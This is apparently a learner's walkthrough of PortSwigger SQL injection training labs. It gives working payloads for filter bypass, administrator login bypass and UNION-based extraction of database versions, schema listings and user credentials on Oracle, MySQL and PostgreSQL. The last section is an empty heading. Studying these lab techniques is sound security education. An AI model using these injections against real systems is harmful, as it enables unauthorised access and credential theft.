## Prologue: What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:

- Retrieving hidden data, where you can modify a SQL query to return additional results.
- Subverting application logic, where you can change a query to interfere with the application's logic.
- UNION attacks, where you can retrieve data from different database tables.
- Blind SQL injection, where the results of a query you control are not returned in the application's responses.

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
This lab contains a SQL injection vulnerability in the product category filter.

When the user selects a category, the application carries out a SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
```

This SQL query asks the database to return:

- all details `*`
- from the `products` table
- where the `category` is `Gifts`
- and `released` is `1`.

The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

As a caveat, take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

## SQL injection vulnerability allowing login bypass
```
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
```
In a similar vein to the previous problem, the SQL query can be translated into:

`SELECT * FROM products WHERE username = '...' AND password = '...'` 

Since there is a SQL injection vulnerability, we can modify the payload so that the query only see the username and neglect (via commenting) the password field, thereby bypassing the login.

`SELECT * FROM products WHERE username = 'administrator'-- AND password = '...'`

<img width="1132" height="510" alt="image" src="https://github.com/user-attachments/assets/c68cb47e-0f90-4e4f-a62c-52bcc2886fb8" />

## SQL injection UNION attack, retrieving data from other tables

```
This lab contains a SQL injection vulnerability in the product category filter.

The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
```

Let me introduce to you a new type of SQL operator/command: **UNION.** The SQL UNION operator is used to combine the result sets of two or more SELECT queries into a single result set by stacking the rows vertically. For now, I will not delve into the tidbits of this command, but rather focusing on the logic of the SQL query in place.

With that said, our exploit payload is:

`products?category=Gifts'+UNION+SELECT+username,+password+FROM+users--` 

The SQL query here can be translated into:

`SELECT X, Y FROM Z WHERE category = 'Gifts' UNION SELECT username, password from users--'...` 

At first, the website only display the articles about our search. Our arbitrary `X`, `Y`, and `Z` here could mean the field `name` , `description` , in the table called `products` , for example. But we don’t care about that, but rather the other table `users` which contains `username` and `password` .

<img width="1908" height="1054" alt="image" src="https://github.com/user-attachments/assets/c0caa58d-de4e-44b1-b734-472a7f79bb9b" />

## SQL injection attack, querying the database type and version on Oracle

```
This lab contains a SQL injection vulnerability in the product category filter.

You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
```

At first, the naive me simply try `/filter?category=Pets'+UNION+SELECT+*+FROM+v$version--`

<img width="1917" height="727" alt="image" src="https://github.com/user-attachments/assets/c5ba1152-d2aa-48b5-9f72-87d8436072a0" />

**It did not work as I had expected. `Internal Server Error`  means my query is not correct. The true reason behind this will be explained in “SQL injection attack, listing the database contents on non-Oracle databases”.**

After some deliberation, I decided to open the hint.

```
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`.

If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
```

This could explain why my `SELECT *` does not work, and I need another workaround according to the hint. What I should do now is to determine the number of columns that are being returned by the query and which columns contain text data. 

We design a payload like this in order to test for the query: `'+UNION+SELECT+'z','z'+FROM+dual--` 

Note that if we exceed, or have not reached the correct number of columns, such as  `'z'`  or `'z', 'z', 'z'`, the result will again be `Internal Server Error` .

<img width="1843" height="631" alt="image" src="https://github.com/user-attachments/assets/bd46ffe5-1328-4531-8c47-a0578790702b" />

We verify that the query is returning two columns, both of which contain text.

[Upon reading the documentation/cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), we know that the query to determine the type and version of the database is `SELECT banner FROM v$version` . Knowing that the query requires exactly two columns, I suppose we can embed another element/column to fulfill this requirement, and we have the payload: `'+UNION+SELECT+BANNER,+'z'+FROM+v$version--`

<img width="1819" height="775" alt="image" src="https://github.com/user-attachments/assets/4eca1ef1-d009-48c9-9416-e75dc0ce87de" />

A more elegant solution could be `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

**Food for thought: Why do we have to `'z'` instead of `z` ?**

In SQL, quotes tell the database that `z` is text data. Therefore, `SELECT 'z' FROM dual;` would return the text value `z` . Without quotes, we have `SELECT z FROM dual;` SQL interprets `z` as an identifier, which is usually a column name. Oracle then looks for a column named `z` in `dual` and raises an error because it does not exist. Common formats in SQL are:

```
'hello'   -- text/string value
123       -- number value
abc       -- column, table, or other SQL name
"abc"     -- quoted identifier/name, not a text value
NULL      -- special SQL null value
```

**What is an identifier, by the way?**

For example, imagine we have a table called `students` , in which the field/column `name` contains two elements `Alice` and `Bob` . As a result, for the SQL query `SELECT name FROM students` :

- `name` is an identifier: it means “the column named `name`.”
- `students` is an identifier: it means “the table named `students`.”

The result hereby:
```
Alice
Bob
```
However, for the query SELECT 'name' FROM students , 'name' in this case is no longer a column/identifier. It is text, so SQL prints the word name once for every row, and the result is: 
```
name
name
```
This explains the two z we see as our test case above.

## SQL injection attack, querying the database type and version on MySQL and Microsoft

```
This lab contains a SQL injection vulnerability in the product category filter.

You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint: You can find some useful payloads on our SQL injection cheat sheet.
```

The hint was a red herring, it’s a half-lie-half-truth and the solution is not there. ☹️

Anyhow, the logic to solve this problem is similar to the previous one, just some small differences in the syntax (Oracle vs. MySQL/Microsoft).

The test-for-how-many-columns-are-there payload: `'+UNION+SELECT+'z','z'%23` 

The attack-for-database-version payload: `'+UNION+SELECT+@@version,+NULL%23`

## SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

`'+UNION+SELECT+'abc','def'--` again confirms that the query returns two columns.

Checking around for the version of the database: `'+UNION+SELECT+version(),+NULL--`

<img width="1698" height="190" alt="image" src="https://github.com/user-attachments/assets/3e8ecf1f-6ad8-448e-890a-fae1a0f005dd" />

Upon reading the documentation, I found a potentially useful command to fetch detailed metadata of the database about tables and views: `SELECT * FROM information_schema.tables` 

Modify the payload a little bit, we have: `'+UNION+SELECT+*,+NULL+FROM+information_schema.tables--` 

For some reason (that I will elaborate down below), it doesn’t work. Upon researching the documentation for PostgreSQL, we learn a thing or two about SQL identifiers. The identifier `table_name` describe the name of the table, and `column_name` the name of the column.

The correct payload should be: 

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

<img width="1918" height="1062" alt="image" src="https://github.com/user-attachments/assets/d6a712eb-2af2-4626-a1f2-075c90cc224a" />

So why the asterisk `*` does not work? This is also a problem I’ve encountered in the previous labs but I did not think much about it at that point. (i’m sooooo dumb ;-;) Simple enough, the query returns two columns. Something like `table_name, NULL` would work. However, `*` the wildcard means return ALL. And ALL is larger than two, so the query is false. 

I then wander around for a bit:

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'pg_partitioned_table'--`

<img width="1918" height="1068" alt="image" src="https://github.com/user-attachments/assets/98b63011-5f37-44fc-a5a2-db2343d53d0c" />

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'pg_partitioned_table'--`

<img width="1908" height="1063" alt="image" src="https://github.com/user-attachments/assets/9a936e98-2301-4ad8-b1b9-a60c64bb815c" />

`'+UNION+SELECT+table_name,column_name+FROM+information_schema.columns--`

<img width="1918" height="1069" alt="image" src="https://github.com/user-attachments/assets/5dbb2f8a-6c83-4f8d-9d56-7a4f5b3bde3a" />

Our objective here is to find the table which contains usernames and passwords, and I have chanced upon this table users_lkziqr and columns username_zswiow and password_pexksb which seems sussy. I have resetted the lab for many times in the process, and I notice the strings that followed the users, username and password differ every time.

<img width="730" height="106" alt="image" src="https://github.com/user-attachments/assets/aba410ef-6414-427e-8622-947241d1642c" />

<img width="715" height="111" alt="image" src="https://github.com/user-attachments/assets/6d199ad8-3e40-462e-96b2-2f457f2f7f99" />

To be honest, initially, I think these random strings bear no relevance to the intended exploit so I ignore it. Then I realize that those are created to deter us from the simple case of a UNION attack. But now it is pivoted to the simple case - a callback to “SQL injection UNION attack, retrieving data from other tables”:

`'+UNION+SELECT+username_zswiow,+password_pexksb+FROM+users_lkziqr--`

<img width="1914" height="1060" alt="image" src="https://github.com/user-attachments/assets/e2d68896-2968-41e6-811e-ba0e1c630f30" />

## **SQL injection attack, listing the database contents on Oracle**

Similar to the last lab, but with Oracle rather than PostgreSQL:

- `'+UNION+SELECT+'z','z'+FROM+dual--`
- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
- `'+UNION+SELECT+table_name,column_name+FROM+all_tab_columns--`

<img width="1918" height="1065" alt="image" src="https://github.com/user-attachments/assets/7e931c5a-c6e4-4743-bada-46ab0d3c2251" />

'+UNION+SELECT+username_ukrtfk,+password_vorwlr+FROM+users_suirpx--

<img width="1806" height="147" alt="image" src="https://github.com/user-attachments/assets/22568312-3d4d-4526-aff7-e87c935e0114" />

## SQL injection UNION attack, determining the number of columns returned by the query





































